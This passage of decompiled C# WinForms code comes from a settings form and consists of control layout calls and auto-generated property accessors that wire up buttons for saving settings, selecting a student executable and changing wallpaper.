			SizeF autoScaleDimensions = new SizeF(6f, 12f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			size = new Size(958, 787);
			this.ClientSize = size;
			this.Controls.Add(this.Label21);
			this.Controls.Add(this.GroupBox11);
			this.Controls.Add(this.Label22);
			this.Controls.Add(this.Label20);
			this.Controls.Add(this.GroupBox8);
			this.Controls.Add(this.Label19);
			this.Controls.Add(this.Label18);
			this.Controls.Add(this.GroupBox6);
			this.Controls.Add(this.Label17);
			this.Controls.Add(this.Label6);
			this.Controls.Add(this.Label3);
			this.Controls.Add(this.Label23);
			this.Controls.Add(this.Label14);
			this.Controls.Add(this.LinkLabel2);
			this.Controls.Add(this.Label9);
			this.Controls.Add(this.Label5);
			this.Controls.Add(this.Label7);
			this.Controls.Add(this.Label10);
			this.Controls.Add(this.GroupBox3);
			this.Controls.Add(this.GroupBox7);
			this.Controls.Add(this.GroupBox12);
			this.Controls.Add(this.GroupBox2);
			this.Controls.Add(this.GroupBox1);
			this.Controls.Add(this.Label16);
			this.Controls.Add(this.Label15);
			this.Controls.Add(this.Label13);
			this.Controls.Add(this.Label12);
			this.Controls.Add(this.Label11);
			this.Controls.Add(this.GroupBox9);
			this.Controls.Add(this.GroupBox10);
			this.Controls.Add(this.Label2);
			this.Controls.Add(this.GroupBox5);
			this.Controls.Add(this.GroupBox4);
			this.Controls.Add(this.Button1);
			this.Name = "Form1";
			this.StartPosition = FormStartPosition.CenterScreen;
			this.Text = "设 置";
			this.GroupBox4.ResumeLayout(false);
			this.GroupBox4.PerformLayout();
			this.GroupBox5.ResumeLayout(false);
			this.GroupBox5.PerformLayout();
			this.GroupBox10.ResumeLayout(false);
			this.GroupBox9.ResumeLayout(false);
			this.GroupBox9.PerformLayout();
			this.GroupBox1.ResumeLayout(false);
			this.GroupBox1.PerformLayout();
			this.GroupBox2.ResumeLayout(false);
			this.GroupBox2.PerformLayout();
			this.GroupBox3.ResumeLayout(false);
			this.GroupBox3.PerformLayout();
			this.GroupBox7.ResumeLayout(false);
			this.GroupBox7.PerformLayout();
			this.GroupBox12.ResumeLayout(false);
			this.GroupBox12.PerformLayout();
			this.GroupBox6.ResumeLayout(false);
			this.GroupBox6.PerformLayout();
			this.GroupBox8.ResumeLayout(false);
			this.GroupBox8.PerformLayout();
			this.GroupBox11.ResumeLayout(false);
			this.GroupBox11.PerformLayout();
			this.ResumeLayout(false);
			this.PerformLayout();
		}

		/// <summary>
		/// 控件 Button1（Button，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000009 RID: 9
		// (get) Token: 0x0600002C RID: 44 RVA: 0x0000515C File Offset: 0x0000335C
		// (set) Token: 0x0600002D RID: 45 RVA: 0x00005170 File Offset: 0x00003370
		internal virtual Button Button1
		{
			get
			{
				return this.m_Button1;
			}
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click_SaveSettings);
				if (this.m_Button1 != null)
				{
					this.m_Button1.Click -= value2;
				}
				this.m_Button1 = value;
				if (this.m_Button1 != null)
				{
					this.m_Button1.Click += value2;
				}
			}
		}

		/// <summary>
		/// 控件 RadioButton1（RadioButton，属性访问器自动生成）。
		/// </summary>
		// Token: 0x1700000A RID: 10
		// (get) Token: 0x0600002E RID: 46 RVA: 0x000051BC File Offset: 0x000033BC
		// (set) Token: 0x0600002F RID: 47 RVA: 0x000021DC File Offset: 0x000003DC
		internal virtual RadioButton RadioButton1
		{
			get
			{
				return this.m_RadioButton1;
			}
			set
			{
				this.m_RadioButton1 = value;
			}
		}

		/// <summary>
		/// 控件 RadioButton2（RadioButton，属性访问器自动生成）。
		/// </summary>
		// Token: 0x1700000B RID: 11
		// (get) Token: 0x06000030 RID: 48 RVA: 0x000051D0 File Offset: 0x000033D0
		// (set) Token: 0x06000031 RID: 49 RVA: 0x000021E5 File Offset: 0x000003E5
		internal virtual RadioButton RadioButton2
		{
			get
			{
				return this.m_RadioButton2;
			}
			set
			{
				this.m_RadioButton2 = value;
			}
		}

		/// <summary>
		/// 控件 RadioButton4（RadioButton，属性访问器自动生成）。
		/// </summary>
		// Token: 0x1700000C RID: 12
		// (get) Token: 0x06000032 RID: 50 RVA: 0x000051E4 File Offset: 0x000033E4
		// (set) Token: 0x06000033 RID: 51 RVA: 0x000021EE File Offset: 0x000003EE
		internal virtual RadioButton RadioButton4
		{
			get
			{
				return this.m_RadioButton4;
			}
			set
			{
				this.m_RadioButton4 = value;
			}
		}

		/// <summary>
		/// 控件 RadioButton3（RadioButton，属性访问器自动生成）。
		/// </summary>
		// Token: 0x1700000D RID: 13
		// (get) Token: 0x06000034 RID: 52 RVA: 0x000051F8 File Offset: 0x000033F8
		// (set) Token: 0x06000035 RID: 53 RVA: 0x000021F7 File Offset: 0x000003F7
		internal virtual RadioButton RadioButton3
		{
			get
			{
				return this.m_RadioButton3;
			}
			set
			{
				this.m_RadioButton3 = value;
			}
		}

		/// <summary>
		/// 控件 RadioButton6（RadioButton，属性访问器自动生成）。
		/// </summary>
		// Token: 0x1700000E RID: 14
		// (get) Token: 0x06000036 RID: 54 RVA: 0x0000520C File Offset: 0x0000340C
		// (set) Token: 0x06000037 RID: 55 RVA: 0x00002200 File Offset: 0x00000400
		internal virtual RadioButton RadioButton6
		{
			get
			{
				return this.m_RadioButton6;
			}
			set
			{
				this.m_RadioButton6 = value;
			}
		}

		/// <summary>
		/// 控件 RadioButton5（RadioButton，属性访问器自动生成）。
		/// </summary>
		// Token: 0x1700000F RID: 15
		// (get) Token: 0x06000038 RID: 56 RVA: 0x00005220 File Offset: 0x00003420
		// (set) Token: 0x06000039 RID: 57 RVA: 0x00002209 File Offset: 0x00000409
		internal virtual RadioButton RadioButton5
		{
			get
			{
				return this.m_RadioButton5;
			}
			set
			{
				this.m_RadioButton5 = value;
			}
		}

		/// <summary>
		/// 控件 OpenFileDialog1（OpenFileDialog，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000010 RID: 16
		// (get) Token: 0x0600003A RID: 58 RVA: 0x00005234 File Offset: 0x00003434
		// (set) Token: 0x0600003B RID: 59 RVA: 0x00002212 File Offset: 0x00000412
		internal virtual OpenFileDialog OpenFileDialog1
		{
			get
			{
				return this.m_OpenFileDialog1;
			}
			set
			{
				this.m_OpenFileDialog1 = value;
			}
		}

		/// <summary>
		/// 控件 Button2（Button，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000011 RID: 17
		// (get) Token: 0x0600003C RID: 60 RVA: 0x00005248 File Offset: 0x00003448
		// (set) Token: 0x0600003D RID: 61 RVA: 0x0000525C File Offset: 0x0000345C
		internal virtual Button Button2
		{
			get
			{
				return this.m_Button2;
			}
			set
			{
				EventHandler value2 = new EventHandler(this.Button2_Click_SelectStudentExe);
				if (this.m_Button2 != null)
				{
					this.m_Button2.Click -= value2;
				}
				this.m_Button2 = value;
				if (this.m_Button2 != null)
				{
					this.m_Button2.Click += value2;
				}
			}
		}

		/// <summary>
		/// 控件 GroupBox4（GroupBox，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000012 RID: 18
		// (get) Token: 0x0600003E RID: 62 RVA: 0x000052A8 File Offset: 0x000034A8
		// (set) Token: 0x0600003F RID: 63 RVA: 0x0000221B File Offset: 0x0000041B
		internal virtual GroupBox GroupBox4
		{
			get
			{
				return this.m_GroupBox4;
			}
			set
			{
				this.m_GroupBox4 = value;
			}
		}

		/// <summary>
		/// 控件 Label1（Label，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000013 RID: 19
		// (get) Token: 0x06000040 RID: 64 RVA: 0x000052BC File Offset: 0x000034BC
		// (set) Token: 0x06000041 RID: 65 RVA: 0x00002224 File Offset: 0x00000424
		internal virtual Label Label1
		{
			get
			{
				return this.m_Label1;
			}
			set
			{
				this.m_Label1 = value;
			}
		}

		/// <summary>
		/// 控件 TextBox1（TextBox，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000014 RID: 20
		// (get) Token: 0x06000042 RID: 66 RVA: 0x000052D0 File Offset: 0x000034D0
		// (set) Token: 0x06000043 RID: 67 RVA: 0x0000222D File Offset: 0x0000042D
		internal virtual TextBox TextBox1
		{
			get
			{
				return this.m_TextBox1;
			}
			set
			{
				this.m_TextBox1 = value;
			}
		}

		/// <summary>
		/// 控件 Button3（Button，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000015 RID: 21
		// (get) Token: 0x06000044 RID: 68 RVA: 0x000052E4 File Offset: 0x000034E4
		// (set) Token: 0x06000045 RID: 69 RVA: 0x000052F8 File Offset: 0x000034F8
		internal virtual Button Button3
		{
			get
			{
				return this.m_Button3;
			}
			set
			{
				EventHandler value2 = new EventHandler(this.Button3_Click_OpenHelpPage);
				if (this.m_Button3 != null)
				{
					this.m_Button3.Click -= value2;
				}
				this.m_Button3 = value;
				if (this.m_Button3 != null)
				{
					this.m_Button3.Click += value2;
				}
			}
		}

		/// <summary>
		/// 控件 GroupBox5（GroupBox，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000016 RID: 22
		// (get) Token: 0x06000046 RID: 70 RVA: 0x00005344 File Offset: 0x00003544
		// (set) Token: 0x06000047 RID: 71 RVA: 0x00002236 File Offset: 0x00000436
		internal virtual GroupBox GroupBox5
		{
			get
			{
				return this.m_GroupBox5;
			}
			set
			{
				this.m_GroupBox5 = value;
			}
		}

		/// <summary>
		/// 控件 pd_new（TextBox，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000017 RID: 23
		// (get) Token: 0x06000048 RID: 72 RVA: 0x00005358 File Offset: 0x00003558
		// (set) Token: 0x06000049 RID: 73 RVA: 0x0000223F File Offset: 0x0000043F
		internal virtual TextBox pd_new
		{
			get
			{
				return this.m_pd_new;
			}
			set
			{
				this.m_pd_new = value;
			}
		}

		/// <summary>
		/// 控件 Label8（Label，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000018 RID: 24
		// (get) Token: 0x0600004A RID: 74 RVA: 0x0000536C File Offset: 0x0000356C
		// (set) Token: 0x0600004B RID: 75 RVA: 0x00002248 File Offset: 0x00000448
		internal virtual Label Label8
		{
			get
			{
				return this.m_Label8;
			}
			set
			{
				this.m_Label8 = value;
			}
		}

		/// <summary>
		/// 控件 Label2（Label，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000019 RID: 25
		// (get) Token: 0x0600004C RID: 76 RVA: 0x00005380 File Offset: 0x00003580
		// (set) Token: 0x0600004D RID: 77 RVA: 0x00002251 File Offset: 0x00000451
		internal virtual Label Label2
		{
			get
			{
				return this.m_Label2;
			}
			set
			{
				this.m_Label2 = value;
			}
		}

		/// <summary>
		/// 控件 RadioButton10（RadioButton，属性访问器自动生成）。
		/// </summary>
		// Token: 0x1700001A RID: 26
		// (get) Token: 0x0600004E RID: 78 RVA: 0x00005394 File Offset: 0x00003594
		// (set) Token: 0x0600004F RID: 79 RVA: 0x0000225A File Offset: 0x0000045A
		internal virtual RadioButton RadioButton10
		{
			get
			{
				return this.m_RadioButton10;
			}
			set
			{
				this.m_RadioButton10 = value;
			}
		}

		/// <summary>
		/// 控件 RadioButton9（RadioButton，属性访问器自动生成）。
		/// </summary>
		// Token: 0x1700001B RID: 27
		// (get) Token: 0x06000050 RID: 80 RVA: 0x000053A8 File Offset: 0x000035A8
		// (set) Token: 0x06000051 RID: 81 RVA: 0x00002263 File Offset: 0x00000463
		internal virtual RadioButton RadioButton9
		{
			get
			{
				return this.m_RadioButton9;
			}
			set
			{
				this.m_RadioButton9 = value;
			}
		}

		/// <summary>
		/// 控件 Label4（Label，属性访问器自动生成）。
		/// </summary>
		// Token: 0x1700001C RID: 28
		// (get) Token: 0x06000052 RID: 82 RVA: 0x000053BC File Offset: 0x000035BC
		// (set) Token: 0x06000053 RID: 83 RVA: 0x0000226C File Offset: 0x0000046C
		internal virtual Label Label4
		{
			get
			{
				return this.m_Label4;
			}
			set
			{
				this.m_Label4 = value;
			}
		}

		/// <summary>
		/// 控件 Label10（Label，属性访问器自动生成）。
		/// </summary>
		// Token: 0x1700001D RID: 29
		// (get) Token: 0x06000054 RID: 84 RVA: 0x000053D0 File Offset: 0x000035D0
		// (set) Token: 0x06000055 RID: 85 RVA: 0x00002275 File Offset: 0x00000475
		internal virtual Label Label10
		{
			get
			{
				return this.m_Label10;
			}
			set
			{
				this.m_Label10 = value;
			}
		}

		/// <summary>
		/// 控件 RadioButton12（RadioButton，属性访问器自动生成）。
		/// </summary>
		// Token: 0x1700001E RID: 30
		// (get) Token: 0x06000056 RID: 86 RVA: 0x000053E4 File Offset: 0x000035E4
		// (set) Token: 0x06000057 RID: 87 RVA: 0x0000227E File Offset: 0x0000047E
		internal virtual RadioButton RadioButton12
		{
			get
			{
				return this.m_RadioButton12;
			}
			set
			{
				this.m_RadioButton12 = value;
			}
		}

		/// <summary>
		/// 控件 RadioButton11（RadioButton，属性访问器自动生成）。
		/// </summary>
		// Token: 0x1700001F RID: 31
		// (get) Token: 0x06000058 RID: 88 RVA: 0x000053F8 File Offset: 0x000035F8
		// (set) Token: 0x06000059 RID: 89 RVA: 0x00002287 File Offset: 0x00000487
		internal virtual RadioButton RadioButton11
		{
			get
			{
				return this.m_RadioButton11;
			}
			set
			{
				this.m_RadioButton11 = value;
			}
		}

		/// <summary>
		/// 控件 GroupBox10（GroupBox，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000020 RID: 32
		// (get) Token: 0x0600005A RID: 90 RVA: 0x0000540C File Offset: 0x0000360C
		// (set) Token: 0x0600005B RID: 91 RVA: 0x00002290 File Offset: 0x00000490
		internal virtual GroupBox GroupBox10
		{
			get
			{
				return this.m_GroupBox10;
			}
			set
			{
				this.m_GroupBox10 = value;
			}
		}

		/// <summary>
		/// 控件 Button_restorepic（Button，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000021 RID: 33
		// (get) Token: 0x0600005C RID: 92 RVA: 0x00005420 File Offset: 0x00003620
		// (set) Token: 0x0600005D RID: 93 RVA: 0x00005434 File Offset: 0x00003634
		internal virtual Button Button_restorepic
		{
			get
			{
				return this.m_Button_restorepic;
			}
			set
			{
				EventHandler value2 = new EventHandler(this.Button_restorepic_Click_RestoreWallpaper);
				if (this.m_Button_restorepic != null)
				{
					this.m_Button_restorepic.Click -= value2;
				}
				this.m_Button_restorepic = value;
				if (this.m_Button_restorepic != null)
				{
					this.m_Button_restorepic.Click += value2;
				}
			}
		}

		/// <summary>
		/// 控件 Button_selectpic（Button，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000022 RID: 34
		// (get) Token: 0x0600005E RID: 94 RVA: 0x00005480 File Offset: 0x00003680
		// (set) Token: 0x0600005F RID: 95 RVA: 0x00005494 File Offset: 0x00003694
		internal virtual Button Button_selectpic
		{
			get
			{
				return this.m_Button_selectpic;
			}
			set
			{
				EventHandler value2 = new EventHandler(this.Button_selectpic_Click_ChooseWallpaper);
				if (this.m_Button_selectpic != null)
				{
					this.m_Button_selectpic.Click -= value2;
				}
				this.m_Button_selectpic = value;
				if (this.m_Button_selectpic != null)
				{
					this.m_Button_selectpic.Click += value2;
				}
			}
		}

		/// <summary>
		/// 控件 GroupBox9（GroupBox，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000023 RID: 35
		// (get) Token: 0x06000060 RID: 96 RVA: 0x000054E0 File Offset: 0x000036E0
		// (set) Token: 0x06000061 RID: 97 RVA: 0x00002299 File Offset: 0x00000499
		internal virtual GroupBox GroupBox9
		{
			get
			{
				return this.m_GroupBox9;
			}
			set
			{
				this.m_GroupBox9 = value;
			}
		}

		/// <summary>
		/// 控件 RadioButton13（RadioButton，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000024 RID: 36
		// (get) Token: 0x06000062 RID: 98 RVA: 0x000054F4 File Offset: 0x000036F4
		// (set) Token: 0x06000063 RID: 99 RVA: 0x000022A2 File Offset: 0x000004A2
		internal virtual RadioButton RadioButton13
		{
			get
			{
				return this.m_RadioButton13;
			}
			set
			{
				this.m_RadioButton13 = value;
			}
		}

		/// <summary>
		/// 控件 RadioButton14（RadioButton，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000025 RID: 37
		// (get) Token: 0x06000064 RID: 100 RVA: 0x00005508 File Offset: 0x00003708
		// (set) Token: 0x06000065 RID: 101 RVA: 0x000022AB File Offset: 0x000004AB
		internal virtual RadioButton RadioButton14
		{
			get
			{
				return this.m_RadioButton14;
			}
			set
			{
				this.m_RadioButton14 = value;
			}
		}

		/// <summary>
		/// 控件 Label11（Label，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000026 RID: 38
		// (get) Token: 0x06000066 RID: 102 RVA: 0x0000551C File Offset: 0x0000371C
		// (set) Token: 0x06000067 RID: 103 RVA: 0x000022B4 File Offset: 0x000004B4
		internal virtual Label Label11
		{
			get
			{
				return this.m_Label11;
			}
			set
			{
				this.m_Label11 = value;
			}
		}

		/// <summary>
		/// 控件 Label12（Label，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000027 RID: 39
		// (get) Token: 0x06000068 RID: 104 RVA: 0x00005530 File Offset: 0x00003730
		// (set) Token: 0x06000069 RID: 105 RVA: 0x000022BD File Offset: 0x000004BD
		internal virtual Label Label12
		{
			get
			{
				return this.m_Label12;
			}
			set
			{
				this.m_Label12 = value;
			}
		}

		/// <summary>
		/// 控件 Label13（Label，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000028 RID: 40
		// (get) Token: 0x0600006A RID: 106 RVA: 0x00005544 File Offset: 0x00003744
		// (set) Token: 0x0600006B RID: 107 RVA: 0x000022C6 File Offset: 0x000004C6
		internal virtual Label Label13
		{
			get
			{
				return this.m_Label13;
			}
			set
			{
				this.m_Label13 = value;
			}
		}

		/// <summary>
		/// 控件 Label15（Label，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000029 RID: 41
		// (get) Token: 0x0600006C RID: 108 RVA: 0x00005558 File Offset: 0x00003758
		// (set) Token: 0x0600006D RID: 109 RVA: 0x000022CF File Offset: 0x000004CF
		internal virtual Label Label15
		{
			get
			{
				return this.m_Label15;
			}
			set
			{
				this.m_Label15 = value;
			}
		}

		/// <summary>
		/// 控件 Label16（Label，属性访问器自动生成）。
		/// </summary>
		// Token: 0x1700002A RID: 42
		// (get) Token: 0x0600006E RID: 110 RVA: 0x0000556C File Offset: 0x0000376C
		// (set) Token: 0x0600006F RID: 111 RVA: 0x000022D8 File Offset: 0x000004D8
		internal virtual Label Label16
		{
			get
			{
				return this.m_Label16;
			}
			set
			{
				this.m_Label16 = value;
			}
		}

		/// <summary>
		/// 控件 GroupBox1（GroupBox，属性访问器自动生成）。
		/// </summary>
		// Token: 0x1700002B RID: 43
		// (get) Token: 0x06000070 RID: 112 RVA: 0x00005580 File Offset: 0x00003780
		// (set) Token: 0x06000071 RID: 113 RVA: 0x000022E1 File Offset: 0x000004E1
		internal virtual GroupBox GroupBox1
		{
			get
			{
				return this.m_GroupBox1;
			}
			set
			{
				this.m_GroupBox1 = value;
			}
		}

		/// <summary>
		/// 控件 GroupBox2（GroupBox，属性访问器自动生成）。
		/// </summary>
		// Token: 0x1700002C RID: 44
		// (get) Token: 0x06000072 RID: 114 RVA: 0x00005594 File Offset: 0x00003794
		// (set) Token: 0x06000073 RID: 115 RVA: 0x000022EA File Offset: 0x000004EA
		internal virtual GroupBox GroupBox2
		{
			get
			{
				return this.m_GroupBox2;
			}
			set
			{
				this.m_GroupBox2 = value;
			}
		}

		/// <summary>
		/// 控件 GroupBox3（GroupBox，属性访问器自动生成）。
		/// </summary>
		// Token: 0x1700002D RID: 45
		// (get) Token: 0x06000074 RID: 116 RVA: 0x000055A8 File Offset: 0x000037A8
		// (set) Token: 0x06000075 RID: 117 RVA: 0x000022F3 File Offset: 0x000004F3
		internal virtual GroupBox GroupBox3
		{
			get
			{
				return this.m_GroupBox3;
			}
			set
			{
				this.m_GroupBox3 = value;
			}
		}

		/// <summary>
		/// 控件 GroupBox7（GroupBox，属性访问器自动生成）。
		/// </summary>
		// Token: 0x1700002E RID: 46
		// (get) Token: 0x06000076 RID: 118 RVA: 0x000055BC File Offset: 0x000037BC
		// (set) Token: 0x06000077 RID: 119 RVA: 0x000022FC File Offset: 0x000004FC
		internal virtual GroupBox GroupBox7
		{
			get
			{
				return this.m_GroupBox7;
			}
			set
			{
				this.m_GroupBox7 = value;
			}
		}

		/// <summary>
		/// 控件 GroupBox12（GroupBox，属性访问器自动生成）。
		/// </summary>
		// Token: 0x1700002F RID: 47
		// (get) Token: 0x06000078 RID: 120 RVA: 0x000055D0 File Offset: 0x000037D0
		// (set) Token: 0x06000079 RID: 121 RVA: 0x00002305 File Offset: 0x00000505
		internal virtual GroupBox GroupBox12
		{
			get
			{
				return this.m_GroupBox12;
			}
			set
			{
				this.m_GroupBox12 = value;
			}
		}

		/// <summary>
		/// 控件 Label7（Label，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000030 RID: 48
		// (get) Token: 0x0600007A RID: 122 RVA: 0x000055E4 File Offset: 0x000037E4
		// (set) Token: 0x0600007B RID: 123 RVA: 0x0000230E File Offset: 0x0000050E
		internal virtual Label Label7
		{
			get
			{
				return this.m_Label7;
			}
			set
			{
				this.m_Label7 = value;
			}
		}

		/// <summary>
		/// 控件 Label5（Label，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000031 RID: 49
		// (get) Token: 0x0600007C RID: 124 RVA: 0x000055F8 File Offset: 0x000037F8
		// (set) Token: 0x0600007D RID: 125 RVA: 0x00002317 File Offset: 0x00000517
		internal virtual Label Label5
		{
			get
			{
				return this.m_Label5;
			}
			set
			{
				this.m_Label5 = value;
			}
		}

		/// <summary>
		/// 控件 Label9（Label，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000032 RID: 50
		// (get) Token: 0x0600007E RID: 126 RVA: 0x0000560C File Offset: 0x0000380C
		// (set) Token: 0x0600007F RID: 127 RVA: 0x00002320 File Offset: 0x00000520
		internal virtual Label Label9
		{
			get
			{
				return this.m_Label9;
			}
			set
			{
				this.m_Label9 = value;
			}
		}

		/// <summary>
		/// 控件 LinkLabel2（LinkLabel，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000033 RID: 51
		// (get) Token: 0x06000080 RID: 128 RVA: 0x00005620 File Offset: 0x00003820
		// (set) Token: 0x06000081 RID: 129 RVA: 0x00005634 File Offset: 0x00003834
		internal virtual LinkLabel LinkLabel2
		{
			get
			{
				return this.m_LinkLabel2;
			}
			set
			{
				LinkLabelLinkClickedEventHandler value2 = new LinkLabelLinkClickedEventHandler(this.LinkLabel2_Click_OpenDownloadPage);
				if (this.m_LinkLabel2 != null)
				{
					this.m_LinkLabel2.LinkClicked -= value2;
				}
				this.m_LinkLabel2 = value;
				if (this.m_LinkLabel2 != null)
				{
					this.m_LinkLabel2.LinkClicked += value2;
				}
			}
		}

		/// <summary>
		/// 控件 Label14（Label，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000034 RID: 52
		// (get) Token: 0x06000082 RID: 130 RVA: 0x00005680 File Offset: 0x00003880
		// (set) Token: 0x06000083 RID: 131 RVA: 0x00002329 File Offset: 0x00000529
		internal virtual Label Label14
		{
			get
			{
				return this.m_Label14;
			}
			set
			{
				this.m_Label14 = value;
			}
		}

		/// <summary>
		/// 控件 Label3（Label，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000035 RID: 53
		// (get) Token: 0x06000084 RID: 132 RVA: 0x00005694 File Offset: 0x00003894
		// (set) Token: 0x06000085 RID: 133 RVA: 0x00002332 File Offset: 0x00000532
		internal virtual Label Label3
		{
			get
			{
				return this.m_Label3;
			}
			set
			{
				this.m_Label3 = value;
			}
		}

		/// <summary>
		/// 控件 Label6（Label，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000036 RID: 54
		// (get) Token: 0x06000086 RID: 134 RVA: 0x000056A8 File Offset: 0x000038A8
		// (set) Token: 0x06000087 RID: 135 RVA: 0x0000233B File Offset: 0x0000053B
		internal virtual Label Label6
		{
			get
			{
				return this.m_Label6;
			}
			set
			{
				this.m_Label6 = value;
			}
		}

		/// <summary>
		/// 控件 Label17（Label，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000037 RID: 55
		// (get) Token: 0x06000088 RID: 136 RVA: 0x000056BC File Offset: 0x000038BC
		// (set) Token: 0x06000089 RID: 137 RVA: 0x00002344 File Offset: 0x00000544
		internal virtual Label Label17
		{
			get
			{
				return this.m_Label17;
			}
			set
			{
				this.m_Label17 = value;
			}
		}

		/// <summary>
		/// 控件 GroupBox6（GroupBox，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000038 RID: 56
		// (get) Token: 0x0600008A RID: 138 RVA: 0x000056D0 File Offset: 0x000038D0
		// (set) Token: 0x0600008B RID: 139 RVA: 0x0000234D File Offset: 0x0000054D
		internal virtual GroupBox GroupBox6
		{
			get
			{
				return this.m_GroupBox6;
			}
			set
			{
				this.m_GroupBox6 = value;
			}
		}

		/// <summary>
		/// 控件 RadioButton8（RadioButton，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000039 RID: 57
		// (get) Token: 0x0600008C RID: 140 RVA: 0x000056E4 File Offset: 0x000038E4
		// (set) Token: 0x0600008D RID: 141 RVA: 0x00002356 File Offset: 0x00000556
		internal virtual RadioButton RadioButton8
		{
			get
			{
				return this.m_RadioButton8;
			}
			set
			{
				this.m_RadioButton8 = value;
			}
		}

		/// <summary>
		/// 控件 RadioButton7（RadioButton，属性访问器自动生成）。
		/// </summary>
		// Token: 0x1700003A RID: 58
		// (get) Token: 0x0600008E RID: 142 RVA: 0x000056F8 File Offset: 0x000038F8
		// (set) Token: 0x0600008F RID: 143 RVA: 0x0000235F File Offset: 0x0000055F
		internal virtual RadioButton RadioButton7
		{
			get
			{
				return this.m_RadioButton7;
			}
			set
			{
				this.m_RadioButton7 = value;
			}
		}

		/// <summary>
		/// 控件 Label18（Label，属性访问器自动生成）。
		/// </summary>
		// Token: 0x1700003B RID: 59
		// (get) Token: 0x06000090 RID: 144 RVA: 0x0000570C File Offset: 0x0000390C
		// (set) Token: 0x06000091 RID: 145 RVA: 0x00002368 File Offset: 0x00000568
		internal virtual Label Label18
		{
			get
			{
				return this.m_Label18;
			}
			set
			{
				this.m_Label18 = value;
			}
		}

		/// <summary>
		/// 控件 GroupBox8（GroupBox，属性访问器自动生成）。
		/// </summary>
		// Token: 0x1700003C RID: 60
		// (get) Token: 0x06000092 RID: 146 RVA: 0x00005720 File Offset: 0x00003920
		// (set) Token: 0x06000093 RID: 147 RVA: 0x00002371 File Offset: 0x00000571
		internal virtual GroupBox GroupBox8
		{
			get
			{
				return this.m_GroupBox8;
			}
			set
			{
				this.m_GroupBox8 = value;
			}
		}

		/// <summary>
		/// 控件 RadioButton15（RadioButton，属性访问器自动生成）。
		/// </summary>
		// Token: 0x1700003D RID: 61
		// (get) Token: 0x06000094 RID: 148 RVA: 0x00005734 File Offset: 0x00003934
		// (set) Token: 0x06000095 RID: 149 RVA: 0x0000237A File Offset: 0x0000057A
		internal virtual RadioButton RadioButton15
		{
			get
			{
				return this.m_RadioButton15;
			}
			set
			{
				this.m_RadioButton15 = value;
			}
		}

		/// <summary>
		/// 控件 RadioButton17（RadioButton，属性访问器自动生成）。
		/// </summary>
		// Token: 0x1700003E RID: 62
		// (get) Token: 0x06000096 RID: 150 RVA: 0x00005748 File Offset: 0x00003948
		// (set) Token: 0x06000097 RID: 151 RVA: 0x00002383 File Offset: 0x00000583
		internal virtual RadioButton RadioButton17
		{
			get
			{
				return this.m_RadioButton17;
			}
			set
			{
				this.m_RadioButton17 = value;
			}
		}

		/// <summary>
		/// 控件 Label19（Label，属性访问器自动生成）。
		/// </summary>
		// Token: 0x1700003F RID: 63
		// (get) Token: 0x06000098 RID: 152 RVA: 0x0000575C File Offset: 0x0000395C
		// (set) Token: 0x06000099 RID: 153 RVA: 0x0000238C File Offset: 0x0000058C
		internal virtual Label Label19
		{
			get
			{
				return this.m_Label19;
			}
			set
			{
				this.m_Label19 = value;
			}
		}

		/// <summary>
		/// 控件 Label20（Label，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000040 RID: 64
		// (get) Token: 0x0600009A RID: 154 RVA: 0x00005770 File Offset: 0x00003970
		// (set) Token: 0x0600009B RID: 155 RVA: 0x00002395 File Offset: 0x00000595
		internal virtual Label Label20
		{
			get
			{
				return this.m_Label20;
			}
			set
			{
				this.m_Label20 = value;
			}
		}

		/// <summary>
		/// 控件 RadioButton16（RadioButton，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000041 RID: 65
		// (get) Token: 0x0600009C RID: 156 RVA: 0x00005784 File Offset: 0x00003984
		// (set) Token: 0x0600009D RID: 157 RVA: 0x0000239E File Offset: 0x0000059E
		internal virtual RadioButton RadioButton16
		{
			get
			{
				return this.m_RadioButton16;
			}
			set
			{
				this.m_RadioButton16 = value;
			}
		}

		/// <summary>
		/// 控件 Label21（Label，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000042 RID: 66
		// (get) Token: 0x0600009E RID: 158 RVA: 0x00005798 File Offset: 0x00003998
		// (set) Token: 0x0600009F RID: 159 RVA: 0x000023A7 File Offset: 0x000005A7
		internal virtual Label Label21
		{
			get
			{
				return this.m_Label21;
			}
			set
			{
				this.m_Label21 = value;
			}
		}

		/// <summary>
		/// 控件 GroupBox11（GroupBox，属性访问器自动生成）。
		/// </summary>
		// Token: 0x17000043 RID: 67
		// (get) Token: 0x060000A0 RID: 160 RVA: 0x000057AC File Offset: 0x000039AC
		// (set) Token: 0x060000A1 RID: 161 RVA: 0x000023B0 File Offset: 0x000005B0
		internal virtual GroupBox GroupBox11
		{
			get
			{
				return this.m_GroupBox11;
			}
			set
			{
